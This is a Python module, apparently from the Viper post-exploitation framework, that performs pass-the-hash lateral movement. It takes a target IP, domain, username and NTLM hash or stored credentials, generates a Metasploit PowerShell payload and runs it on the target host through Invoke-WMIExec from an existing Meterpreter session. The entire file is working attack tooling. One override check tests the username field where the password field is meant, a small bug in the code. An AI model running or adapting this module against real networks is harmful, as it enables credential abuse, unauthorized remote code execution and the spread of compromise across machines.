# -*- coding: utf-8 -*-
# @File  : SimplePostPowershellModule.py
# @Date  : 2019/1/12
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFPowershellFunctionModule):
    NAME_ZH = "Invoke-WMIExec哈希传递"
    DESC_ZH = "使用已知的用户名及NTLM哈希,通过wmi方式在目标主机执行载荷.\n" \
              "模块使用内存执行Invoke-WMIExec方式执行wmi,相较于<WMI哈希传递>无需上传文件"

    NAME_EN = "Invoke-WMIExec PTH"
    DESC_EN = "Use username and NTLM hash to execute the payload on the target host through wmi.\n" \
              "The module uses the memory to execute Invoke-WMIExec to execute wmi,\n" \
              " compared with <WMI Hash PTH>,this module do not need to upload files"

    MODULETYPE = TAG2TYPE.Lateral_Movement
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1135"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/mhgwsv"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1135/"]
    AUTHOR = ["Viper"]
    OPTIONS = register_options([
        OptionStr(name='host',
                  tag_zh="目标IP", desc_zh="横向移动目标的IP地址",
                  tag_en="Target IP", desc_en="The IP address of the lateral movement target",
                  required=True),
        OptionStr(name='SMBDomain',
                  tag_zh="域", desc_zh="目标主机的域,如果目标不在域中则为空",
                  tag_en="Domain", desc_en="The domain of the target host, empty if the target is not in the domain", ),
        OptionStr(name='SMBUser',
                  tag_zh="用户名", desc_zh="smb用户名",
                  tag_en="User", desc_en="smb username", ),
        OptionStr(name='SMBPass',
                  tag_zh="哈希", desc_zh="NTLM哈希(LM:NTLM或NTLM)",
                  tag_en="Hash", desc_en="NTLM hash (LM: NTLM or NTLM)", ),
        OptionCredentialEnum(required=False, password_type=['windows', ]),
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.set_script("Invoke-WMIExec.ps1")  # 设置目标机执行的脚本文件

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        payload_cmd = self.generate_payload("psh-cmd")
        try:
            payload_cmd = payload_cmd.decode()[30:]
        except Exception as E:
            return False, "生成载荷失败", "Failed to generate payload"

        credential_config = self.get_credential_config()
        if credential_config is not None:
            domain = credential_config.get('tag').get('domain')
            username = credential_config.get('username')
            password = credential_config.get('password')
            # 手工输入覆盖凭证输入
            if self.param('SMBDomain') is not None and self.param('SMBDomain') != "":
                domain = self.param('SMBDomain')
            if self.param('SMBUser') is not None and self.param('SMBUser') != "":
                username = self.param('SMBUser')
            if self.param('SMBUser') is not None and self.param('SMBUser') != "":
                password = self.param('SMBPass')
        else:
            domain = self.param('SMBDomain')
            username = self.param('SMBUser')
            password = self.param('SMBPass')

        if domain is None or domain == "":
            domain_user = username
        else:
            domain_user = f"{username}@{domain}"
        self.set_execute_string(
            f'Invoke-WMIExec -Target {self.param("host")} -Username {domain_user} -Hash {password} -Command "{payload_cmd}" -verbose')
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_raw(data)
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
